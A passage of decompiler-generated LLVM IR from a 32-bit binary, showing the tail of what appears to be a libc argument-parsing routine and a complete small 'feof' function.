  %v1_8051cf7 = add i32 %v0_8051d40, -134584469
  store i32 %v1_8051cf7, i32* %edx.global-to-local, align 4
  %v7_8051d00 = icmp sgt i32 %v1_8051cf7, 17
  br i1 %v7_8051d00, label %dec_label_pc_8051d02, label %dec_label_pc_8051d0a

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051cf5
  %v3_8051d02 = and i32 %v2_8051cdb, 1024
  %v4_8051d02 = icmp eq i32 %v3_8051d02, 0
  br i1 %v4_8051d02, label %dec_label_pc_8051d0a, label %dec_label_pc_8051d07

dec_label_pc_8051d07:                             ; preds = %dec_label_pc_8051d02
  %v1_8051d07 = add i32 %v0_8051d40, -134584471
  store i32 %v1_8051d07, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d0a

dec_label_pc_8051d0a:                             ; preds = %dec_label_pc_8051cf5, %dec_label_pc_8051d02, %dec_label_pc_8051d07
  %v0_8051d13 = phi i32 [ %v1_8051cf7, %dec_label_pc_8051cf5 ], [ %v1_8051cf7, %dec_label_pc_8051d02 ], [ %v1_8051d07, %dec_label_pc_8051d07 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805988b.487 to i32), i32* %ecx.global-to-local, align 4
  %v2_8051d13 = add i32 %tmp76, 32
  %v3_8051d13 = inttoptr i32 %v2_8051d13 to i32*
  store i32 %v0_8051d13, i32* %v3_8051d13, align 4
  %v0_8051d16.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8051d1a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d16

dec_label_pc_8051d16:                             ; preds = %dec_label_pc_8051d16, %dec_label_pc_8051d0a
  %v0_8051d16 = phi i32 [ %v1_8051d16, %dec_label_pc_8051d16 ], [ %v0_8051d16.pre, %dec_label_pc_8051d0a ]
  %v1_8051d16 = add i32 %v0_8051d16, 1
  store i32 %v1_8051d16, i32* %ecx.global-to-local, align 4
  %v1_8051d17 = inttoptr i32 %v1_8051d16 to i8*
  %v2_8051d17 = load i8, i8* %v1_8051d17, align 1
  %v3_8051d17 = sext i8 %v2_8051d17 to i32
  store i32 %v3_8051d17, i32* %eax.global-to-local, align 4
  %v8_8051d1c = icmp sgt i32 %v0_8051d1a.pre, %v3_8051d17
  br i1 %v8_8051d1c, label %dec_label_pc_8051d16, label %dec_label_pc_8051d1e

dec_label_pc_8051d1e:                             ; preds = %dec_label_pc_8051d16
  store i32 ptrtoint ([21 x i8]* @global_var_8059895.486 to i32), i32* @ecx, align 4
  %v1_8051d25 = add i32 %v0_8051d16, -134584459
  store i32 %v1_8051d25, i32* %eax.global-to-local, align 4
  %v2_8051d2a = add i32 %v0_8051d16, add (i32 ptrtoint (i32* @global_var_805987c.488 to i32), i32 -134584459)
  %v3_8051d2a = add i32 %v2_8051d2a, %v1_8051d25
  %v4_8051d2a = inttoptr i32 %v3_8051d2a to i16*
  %v5_8051d2a = load i16, i16* %v4_8051d2a, align 2
  %v6_8051d2a = sext i16 %v5_8051d2a to i32
  store i32 %v6_8051d2a, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8051d25, 2
  %v3_8051d32 = add i32 %factor, 134584428
  %v4_8051d32 = inttoptr i32 %v3_8051d32 to i16*
  %v5_8051d32 = load i16, i16* %v4_8051d32, align 2
  %v6_8051d32 = sext i16 %v5_8051d32 to i32
  store i32 %v6_8051d32, i32* %eax.global-to-local, align 4
  %v1_8051d3a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d3a = or i32 %v1_8051d3a, %v6_8051d2a
  %v2_8051d3c = and i32 %v2_8051d3a, %v6_8051d32
  store i32 %v2_8051d3c, i32* %edx.global-to-local, align 4
  %v0_8051d4e.pre = load i32, i32* @esi, align 4
  %v0_8051d51.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051d46

dec_label_pc_8051d40:                             ; preds = %dec_label_pc_8051cf1
  %v1_8051d40 = add i32 %v0_8051d40, 1
  store i32 %v1_8051d40, i32* @ecx, align 4
  %v1_8051d41 = inttoptr i32 %v1_8051d40 to i8*
  %v2_8051d41 = load i8, i8* %v1_8051d41, align 1
  %v3_8051d41 = icmp eq i8 %v2_8051d41, 0
  %v1_8051d44 = icmp eq i1 %v3_8051d41, false
  br i1 %v1_8051d44, label %dec_label_pc_8051cf1, label %dec_label_pc_8051d46

dec_label_pc_8051d46:                             ; preds = %dec_label_pc_8051d40, %dec_label_pc_8051d1e
  %v0_8051d51 = phi i32 [ %v0_8051d51.pre, %dec_label_pc_8051d1e ], [ %storemerge4, %dec_label_pc_8051d40 ]
  %v0_8051d4e = phi i32 [ %v0_8051d4e.pre, %dec_label_pc_8051d1e ], [ %v0_8051cde, %dec_label_pc_8051d40 ]
  %v0_8051d46 = phi i32 [ %v2_8051d3c, %dec_label_pc_8051d1e ], [ %v3_8051ced, %dec_label_pc_8051d40 ]
  store i32 %v0_8051d46, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051d4e = inttoptr i32 %v0_8051d4e to i8*
  %v2_8051d4e = load i8, i8* %v1_8051d4e, align 1
  %v3_8051d4e = sext i8 %v2_8051d4e to i32
  store i32 %v3_8051d4e, i32* %eax.global-to-local, align 4
  %v2_8051d51 = add i32 %tmp76, 4
  %v3_8051d51 = inttoptr i32 %v2_8051d51 to i32*
  store i32 %v0_8051d51, i32* %v3_8051d51, align 4
  %v0_8051d54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d54 = load i32, i32* @edx, align 4
  %v2_8051d54 = add i32 %v1_8051d54, 12
  %v3_8051d54 = inttoptr i32 %v2_8051d54 to i32*
  store i32 %v0_8051d54, i32* %v3_8051d54, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_8051d5b = load i32, i32* @edx, align 4
  %v1_8051d5b = add i32 %v0_8051d5b, 28
  %v2_8051d5b = inttoptr i32 %v1_8051d5b to i32*
  store i32 1, i32* %v2_8051d5b, align 4
  %v0_8051d62 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d62 = load i32, i32* @edx, align 4
  %v2_8051d62 = add i32 %v1_8051d62, 8
  %v3_8051d62 = inttoptr i32 %v2_8051d62 to i32*
  store i32 %v0_8051d62, i32* %v3_8051d62, align 4
  %v0_8051d65 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051d6f = and i32 %v0_8051d65, -5
  %v0_8051d75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d75 = and i32 %v0_8051d75, 3840
  store i32 %v1_8051d75, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_8051d7e = or i32 %v1_8051d75, %v1_8051d6f
  store i32 %v2_8051d7e, i32* @edi, align 4
  %v1_8051d80 = load i32, i32* @edx, align 4
  %v2_8051d80 = add i32 %v1_8051d80, 20
  %v3_8051d80 = inttoptr i32 %v2_8051d80 to i32*
  store i32 48, i32* %v3_8051d80, align 4
  %v0_8051d83 = load i32, i32* @edi, align 4
  %v1_8051d83 = load i32, i32* @edx, align 4
  %v2_8051d83 = add i32 %v1_8051d83, 16
  %v3_8051d83 = inttoptr i32 %v2_8051d83 to i32*
  store i32 %v0_8051d83, i32* %v3_8051d83, align 4
  %v0_8051d86 = load i32, i32* @ecx, align 4
  %v1_8051d86 = inttoptr i32 %v0_8051d86 to i8*
  %v2_8051d86 = load i8, i8* %v1_8051d86, align 1
  %v3_8051d86 = icmp eq i8 %v2_8051d86, 0
  %v1_8051d89 = icmp eq i1 %v3_8051d86, false
  br i1 %v1_8051d89, label %dec_label_pc_8051da2, label %dec_label_pc_8051d8b

dec_label_pc_8051d8b:                             ; preds = %dec_label_pc_8051d46
  %v0_8051d8b = load i32, i32* @esi, align 4
  %v1_8051d8b = inttoptr i32 %v0_8051d8b to i8*
  %v2_8051d8b = load i8, i8* %v1_8051d8b, align 1
  %v11_8051d8b = icmp eq i8 %v2_8051d8b, 109
  %v1_8051d8e = icmp eq i1 %v11_8051d8b, false
  br i1 %v1_8051d8e, label %dec_label_pc_8051e94, label %dec_label_pc_8051d94

dec_label_pc_8051d94:                             ; preds = %dec_label_pc_8051d8b
  %v0_8051d94 = load i32, i32* @edx, align 4
  %v1_8051d94 = add i32 %v0_8051d94, 32
  %v2_8051d94 = inttoptr i32 %v1_8051d94 to i32*
  store i32 20, i32* %v2_8051d94, align 4
  %v0_8051d9b = load i32, i32* @edx, align 4
  %v1_8051d9b = add i32 %v0_8051d9b, 28
  %v2_8051d9b = inttoptr i32 %v1_8051d9b to i32*
  store i32 0, i32* %v2_8051d9b, align 4
  br label %dec_label_pc_8051da2

dec_label_pc_8051da2:                             ; preds = %dec_label_pc_8051d46, %dec_label_pc_8051d94
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_8051e36, label %dec_label_pc_8051dad

dec_label_pc_8051dad:                             ; preds = %dec_label_pc_8051da2
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_8051dee = add i32 %tmp76, 40
  %v1_8051e27 = add i32 %tmp76, 28
  %v2_8051e27 = inttoptr i32 %v1_8051e27 to i32*
  %v4_8051dbc = add i32 %tmp76, 36
  br label %dec_label_pc_8051daf

dec_label_pc_8051daf:                             ; preds = %dec_label_pc_8051e22, %dec_label_pc_8051dad
  %v0_8051dc5 = phi i32 [ 0, %dec_label_pc_8051dad ], [ %v1_8051e26, %dec_label_pc_8051e22 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051dad ], [ %stack_var_-88.5, %dec_label_pc_8051e22 ]
  %v1_8051daf = add i32 %v0_8051dc5, -2
  %v6_8051daf = sub i32 1, %v0_8051dc5
  %v7_8051daf = and i32 %v6_8051daf, %v0_8051dc5
  %v8_8051daf = icmp slt i32 %v7_8051daf, 0
  %v9_8051daf = icmp eq i32 %v1_8051daf, 0
  %v10_8051daf = icmp slt i32 %v1_8051daf, 0
  %v3_8051db2 = icmp eq i1 %v10_8051daf, %v8_8051daf
  %v4_8051db2 = icmp eq i1 %v9_8051daf, false
  %v5_8051db2 = and i1 %v4_8051db2, %v3_8051db2
  br i1 %v5_8051db2, label %dec_label_pc_8051dc5, label %dec_label_pc_8051db4

dec_label_pc_8051db4:                             ; preds = %dec_label_pc_8051daf
  store i32 %tmp76, i32* @edx, align 4
  %v0_8051db8 = load i32, i32* @esp, align 4
  %v2_8051db8 = mul i32 %v0_8051dc5, 4
  %v3_8051db8 = add i32 %v2_8051db8, 68
  %v4_8051db8 = add i32 %v3_8051db8, %v0_8051db8
  %v5_8051db8 = inttoptr i32 %v4_8051db8 to i32*
  %v6_8051db8 = load i32, i32* %v5_8051db8, align 4
  store i32 %v6_8051db8, i32* %eax.global-to-local, align 4
  %v1_8051dbc = trunc i32 %v6_8051db8 to i8
  %v5_8051dbc = add i32 %v4_8051dbc, %v0_8051dc5
  %v6_8051dbc = inttoptr i32 %v5_8051dbc to i8*
  store i8 %v1_8051dbc, i8* %v6_8051dbc, align 1
  %v0_8051dc0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051dc0 = urem i32 %v0_8051dc0, 256
  br label %dec_label_pc_8051dce

dec_label_pc_8051dc5:                             ; preds = %dec_label_pc_8051daf
  %v5_8051dc7 = add i32 %v0_8051dc5, %stack_var_-32.3
  store i32 %v5_8051dc7, i32* %eax.global-to-local, align 4
  %v1_8051dcb = add i32 %v5_8051dc7, -2
  br label %dec_label_pc_8051dce

dec_label_pc_8051dce:                             ; preds = %dec_label_pc_8051db4, %dec_label_pc_8051dc5
  %v0_8051de1 = phi i32 [ %v1_8051dc0, %dec_label_pc_8051db4 ], [ %v1_8051dcb, %dec_label_pc_8051dc5 ]
  store i32 %v0_8051de1, i32* %eax.global-to-local, align 4
  %v5_8051dce = sub i32 %v0_8051de1, %stack_var_-88.4
  %v11_8051dce = xor i32 %v0_8051de1, %stack_var_-88.4
  %v12_8051dce = xor i32 %v5_8051dce, %v0_8051de1
  %v13_8051dce = and i32 %v12_8051dce, %v11_8051dce
  %v14_8051dce = icmp slt i32 %v13_8051dce, 0
  %v15_8051dce = icmp eq i32 %v5_8051dce, 0
  %v16_8051dce = icmp slt i32 %v5_8051dce, 0
  %v3_8051dd2 = icmp ne i1 %v16_8051dce, %v14_8051dce
  %v4_8051dd2 = or i1 %v15_8051dce, %v3_8051dd2
  br i1 %v4_8051dd2, label %dec_label_pc_8051de1, label %dec_label_pc_8051dd4

dec_label_pc_8051dd4:                             ; preds = %dec_label_pc_8051dce
  %v1_8051dd4 = add i32 %v0_8051de1, -9
  %v6_8051dd4 = sub i32 8, %v0_8051de1
  %v7_8051dd4 = and i32 %v6_8051dd4, %v0_8051de1
  %v8_8051dd4 = icmp slt i32 %v7_8051dd4, 0
  %v9_8051dd4 = icmp eq i32 %v1_8051dd4, 0
  %v10_8051dd4 = icmp slt i32 %v1_8051dd4, 0
  %v3_8051dd7 = icmp eq i1 %v10_8051dd4, %v8_8051dd4
  %v4_8051dd7 = icmp eq i1 %v9_8051dd4, false
  %v5_8051dd7 = and i1 %v4_8051dd7, %v3_8051dd7
  br i1 %v5_8051dd7, label %dec_label_pc_8051e94, label %dec_label_pc_8051de1

dec_label_pc_8051de1:                             ; preds = %dec_label_pc_8051dd4, %dec_label_pc_8051dce
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_8051dce ], [ %v0_8051de1, %dec_label_pc_8051dd4 ]
  %v1_8051de1 = add i32 %v0_8051de1, -1
  store i32 %v1_8051de1, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_8051dea = load i32, i32* @esp, align 4
  %v1_8051dea = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051dea = mul i32 %v1_8051dea, 4
  %v3_8051dea = add i32 %v0_8051dea, 80
  %v4_8051dea = add i32 %v3_8051dea, %v2_8051dea
  %v5_8051dea = inttoptr i32 %v4_8051dea to i32*
  %v6_8051dea = load i32, i32* %v5_8051dea, align 4
  store i32 %v6_8051dea, i32* %edi.global-to-local, align 4
  %v2_8051dee = mul i32 %v1_8051de1, 4
  %v4_8051dee = add i32 %v3_8051dee, %v2_8051dee
  %v5_8051dee = inttoptr i32 %v4_8051dee to i32*
  %v6_8051dee = load i32, i32* %v5_8051dee, align 4
  store i32 %v6_8051dee, i32* @eax, align 4
  %v9_8051df2 = icmp eq i32 %v6_8051dea, 8
  br i1 %v9_8051df2, label %dec_label_pc_8051e22, label %dec_label_pc_8051df7

dec_label_pc_8051df7:                             ; preds = %dec_label_pc_8051de1
  %v9_8051df7 = icmp eq i32 %v6_8051dee, 8
  br i1 %v9_8051df7, label %dec_label_pc_8051e12, label %dec_label_pc_8051dfc

dec_label_pc_8051dfc:                             ; preds = %dec_label_pc_8051df7
  %v12_8051dfc = icmp eq i32 %v6_8051dee, %v6_8051dea
  br i1 %v12_8051dfc, label %dec_label_pc_8051e12, label %dec_label_pc_8051e00

dec_label_pc_8051e00:                             ; preds = %dec_label_pc_8051dfc
  %v1_8051e00 = call i32 @_promoted_size(i32 %v1_8051de1)
  store i32 %v1_8051e00, i32* %ebx.global-to-local, align 4
  %v0_8051e07 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8051e07, i32* @eax, align 4
  %v1_8051e09 = call i32 @_promoted_size(i32 %v1_8051de1)
  store i32 %v1_8051e09, i32* %eax.global-to-local, align 4
  %v8_8051e10 = icmp sgt i32 %v1_8051e00, %v1_8051e09
  br i1 %v8_8051e10, label %dec_label_pc_8051e22, label %dec_label_pc_8051e00.dec_label_pc_8051e12_crit_edge

dec_label_pc_8051e00.dec_label_pc_8051e12_crit_edge: ; preds = %dec_label_pc_8051e00
  %v0_8051e1a.pre = load i32, i32* @esp, align 4
  %v1_8051e1a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051e12

dec_label_pc_8051e12:                             ; preds = %dec_label_pc_8051e00.dec_label_pc_8051e12_crit_edge, %dec_label_pc_8051dfc, %dec_label_pc_8051df7
  %v1_8051e1a = phi i32 [ %v1_8051e1a.pre, %dec_label_pc_8051e00.dec_label_pc_8051e12_crit_edge ], [ %v1_8051dea, %dec_label_pc_8051dfc ], [ %v1_8051dea, %dec_label_pc_8051df7 ]
  %v0_8051e1a = phi i32 [ %v0_8051e1a.pre, %dec_label_pc_8051e00.dec_label_pc_8051e12_crit_edge ], [ %v0_8051dea, %dec_label_pc_8051dfc ], [ %v0_8051dea, %dec_label_pc_8051df7 ]
  store i32 %v1_8051de1, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_8051e1a = mul i32 %v1_8051e1a, 4
  %v3_8051e1a = add i32 %v0_8051e1a, 80
  %v4_8051e1a = add i32 %v3_8051e1a, %v2_8051e1a
  %v5_8051e1a = inttoptr i32 %v4_8051e1a to i32*
  %v6_8051e1a = load i32, i32* %v5_8051e1a, align 4
  store i32 %v6_8051e1a, i32* %eax.global-to-local, align 4
  store i32 %v6_8051e1a, i32* %v5_8051dee, align 4
  br label %dec_label_pc_8051e22

dec_label_pc_8051e22:                             ; preds = %dec_label_pc_8051e00, %dec_label_pc_8051de1, %dec_label_pc_8051e12
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8051e26 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051e26 = add i32 %v0_8051e26, 1
  store i32 %v1_8051e26, i32* %ebp.global-to-local, align 4
  %v3_8051e27 = load i32, i32* %v2_8051e27, align 4
  %v1_8051e2a = add i32 %v3_8051e27, 2
  store i32 %v1_8051e2a, i32* %eax.global-to-local, align 4
  %v5_8051e2f = icmp slt i32 %v1_8051e26, %v1_8051e2a
  br i1 %v5_8051e2f, label %dec_label_pc_8051daf, label %dec_label_pc_8051e5d

dec_label_pc_8051e36:                             ; preds = %dec_label_pc_8051da2
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051e3a = add i32 %tmp76, 38
  %v2_8051e3a = inttoptr i32 %v1_8051e3a to i8*
  store i8 1, i8* %v2_8051e3a, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051e43 = add i32 %tmp76, 28
  %v2_8051e43 = inttoptr i32 %v1_8051e43 to i32*
  %v3_8051e43 = load i32, i32* %v2_8051e43, align 4
  %v2_8051e46 = mul i32 %v3_8051e43, 4
  %v2_8051e4a = ptrtoint i32* %stack_var_-20 to i32
  %v1_8051e51 = add i32 %tmp76, 40
  store i32 %v1_8051e51, i32* %eax.global-to-local, align 4
  %v3_8051e55 = inttoptr i32 %v1_8051e51 to i16*
  %v4_8051e55 = call i32 @memcpy(i16* %v3_8051e55, i32 %v2_8051e4a, i32 %v2_8051e46)
  store i32 %v4_8051e55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051e5d

dec_label_pc_8051e5d:                             ; preds = %dec_label_pc_8051e22, %dec_label_pc_8051e36
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051e36 ], [ %stack_var_-88.5, %dec_label_pc_8051e22 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_8051b08, align 4
  %v0_8051e68 = load i32, i32* @ecx, align 4
  %v1_8051e68 = add i32 %v0_8051e68, 16
  %v2_8051e68 = inttoptr i32 %v1_8051e68 to i8*
  %v3_8051e68 = load i8, i8* %v2_8051e68, align 1
  %v5_8051e68 = icmp slt i8 %v3_8051e68, 0
  br i1 %v5_8051e68, label %dec_label_pc_8051e75, label %dec_label_pc_8051e6e

dec_label_pc_8051e6e:                             ; preds = %dec_label_pc_8051e5d
  %v0_8051e6e = load i32, i32* @esi, align 4
  %v1_8051e6e = add i32 %v0_8051e6e, 1
  store i32 %v1_8051e6e, i32* %eax.global-to-local, align 4
  %v2_8051e71 = inttoptr i32 %v0_8051e68 to i32*
  store i32 %v1_8051e6e, i32* %v2_8051e71, align 4
  br label %dec_label_pc_8051e88

dec_label_pc_8051e75:                             ; preds = %dec_label_pc_8051e5d
  store i32 %v4_8051adc, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8051e7d = load i32, i32* @esi, align 4
  %v2_8051e7d = sub i32 %v0_8051e7d, %v4_8051adc
  store i32 %v2_8051e7d, i32* %esi.global-to-local, align 4
  %v1_8051e7f = mul i32 %v2_8051e7d, 4
  %v2_8051e7f = add i32 %v1_8051e7f, 224
  store i32 %v2_8051e7f, i32* %eax.global-to-local, align 4
  %v2_8051e86 = load i32, i32* %arg1, align 4
  %v4_8051e86 = add i32 %v2_8051e86, %v2_8051e7f
  store i32 %v4_8051e86, i32* %arg1, align 4
  br label %dec_label_pc_8051e88

dec_label_pc_8051e88:                             ; preds = %dec_label_pc_8051e6e, %dec_label_pc_8051e75
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051e8c = add i32 %tmp76, 28
  %v2_8051e8c = inttoptr i32 %v1_8051e8c to i32*
  %v3_8051e8c = load i32, i32* %v2_8051e8c, align 4
  store i32 %v3_8051e8c, i32* %eax.global-to-local, align 4
  %v1_8051e8f = add i32 %v3_8051e8c, 2
  br label %dec_label_pc_8051e97

dec_label_pc_8051e94:                             ; preds = %dec_label_pc_8051b2d, %dec_label_pc_8051bc7, %dec_label_pc_8051bfa, %dec_label_pc_8051c75, %dec_label_pc_8051c61, %dec_label_pc_8051c58, %dec_label_pc_8051dd4, %dec_label_pc_8051d8b, %dec_label_pc_8051cd7
  br label %dec_label_pc_8051e97

dec_label_pc_8051e97:                             ; preds = %dec_label_pc_8051e88, %dec_label_pc_8051e94
  %storemerge6 = phi i32 [ %v1_8051e8f, %dec_label_pc_8051e88 ], [ -1, %dec_label_pc_8051e94 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8051e9a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051e9a, i32* @ebx, align 4
  store i32 %v0_8051adb, i32* @esi, align 4
  store i32 %v0_8051ada, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_8051e26, { 0, 2, 1 }
  uselistorder i32 %v1_8051de1, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8051dd4, { 1, 0 }
  uselistorder i32 %v5_8051dce, { 1, 2, 0 }
  uselistorder i32 %v0_8051de1, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8051daf, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8051dc5, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_8051d40, { 1, 2, 0 }
  uselistorder i32 %v1_8051d16, { 1, 2, 0 }
  uselistorder i32 %v0_8051d40, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8051cdb, { 1, 0 }
  uselistorder i32 %v1_8051cca, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8051cd3, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8051cbd, { 0, 2, 3, 1 }
  uselistorder i32 %v6_8051cb3, { 1, 0 }
  uselistorder i32 %v1_8051c95, { 1, 0 }
  uselistorder i32 %v0_8051cb3.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8051c78, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8051c6f, { 1, 2, 0 }
  uselistorder i32 %v0_8051c35, { 1, 0 }
  uselistorder i32 %v1_8051c27, { 1, 0 }
  uselistorder i32 %v1_8051c22, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8051c20, { 2, 0, 1 }
  uselistorder i32 %v0_8051c42, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8051bdd, { 1, 2, 0 }
  uselistorder i32 %v0_8051bb5, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8051ba8.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8051ba1.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_8051bab, { 1, 2, 0 }
  uselistorder i32 %v6_8051ba9, { 0, 2, 1 }
  uselistorder i32 %v1_8051ba8, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8051ba1, { 2, 1, 0 }
  uselistorder i32 %v1_8051b99, { 1, 0 }
  uselistorder i32 %v1_8051ba1137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_8051b91, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_8051b84, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_8051b7f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051b55, { 0, 2, 1 }
  uselistorder i32 %v2_8051b44, { 1, 0 }
  uselistorder i32 %v0_8051b42, { 2, 0, 1 }
  uselistorder i32 %v4_8051adc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 43, 30, 29, 31, 32, 34, 33, 44, 42, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134584459, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8059895.486 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8051e97, { 1, 0 }
  uselistorder label %dec_label_pc_8051e94, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051e88, { 1, 0 }
  uselistorder label %dec_label_pc_8051e5d, { 1, 0 }
  uselistorder label %dec_label_pc_8051e22, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051dce, { 1, 0 }
  uselistorder label %dec_label_pc_8051da2, { 1, 0 }
  uselistorder label %dec_label_pc_8051d0a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051cd7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051cae, { 1, 0 }
  uselistorder label %dec_label_pc_8051c85, { 1, 0 }
  uselistorder label %dec_label_pc_8051c4c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8051bef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ba8, { 1, 0 }
  uselistorder label %dec_label_pc_8051b99, { 1, 0 }
  uselistorder label %dec_label_pc_8051b8f, { 1, 0 }
  uselistorder label %dec_label_pc_8051b78, { 1, 0 }
  uselistorder label %dec_label_pc_8051b78.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_8051ea3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_8051eaa = add i32 %tmp5, 52
  %v2_8051eaa = inttoptr i32 %v1_8051eaa to i32*
  %v3_8051eaa = load i32, i32* %v2_8051eaa, align 4
  %v1_8051ead = icmp eq i32 %v3_8051eaa, 0
  %v1_8051eaf = icmp eq i1 %v1_8051ead, false
  br i1 %v1_8051eaf, label %dec_label_pc_8051ed0.thread, label %dec_label_pc_8051ed6

dec_label_pc_8051ed0.thread:                      ; preds = %entry
  %v2_8051ed016 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8051ee7

dec_label_pc_8051ed6:                             ; preds = %entry
  %v1_8051eb1 = add i32 %tmp5, 56
  store i32 %v12_8051ea3, i32* @eax, align 4
  %v2_8051ec0 = call i32 @__pthread_return_void(i32 %v12_8051ea3, i32 134563799)
  %v1_8051ec8 = call i32 @__pthread_return_0(i32 %v1_8051eb1)
  %v0_8051ed0.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ed0 = inttoptr i32 %v0_8051ed0.pre to i32*
  %v2_8051ed0 = load i32, i32* %v1_8051ed0, align 4
  store i32 %v12_8051ea3, i32* @eax, align 4
  %v2_8051edf = call i32 @__pthread_return_void(i32 %v12_8051ea3, i32 1)
  br label %dec_label_pc_8051ee7

dec_label_pc_8051ee7:                             ; preds = %dec_label_pc_8051ed0.thread, %dec_label_pc_8051ed6
  %v0_8051ee7 = phi i32 [ %v2_8051ed0, %dec_label_pc_8051ed6 ], [ %v2_8051ed016, %dec_label_pc_8051ed0.thread ]
  %v1_8051eec = and i32 %v0_8051ee7, 4
  ret i32 %v1_8051eec

; uselistorder directives
  uselistorder i32 %v12_8051ea3, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
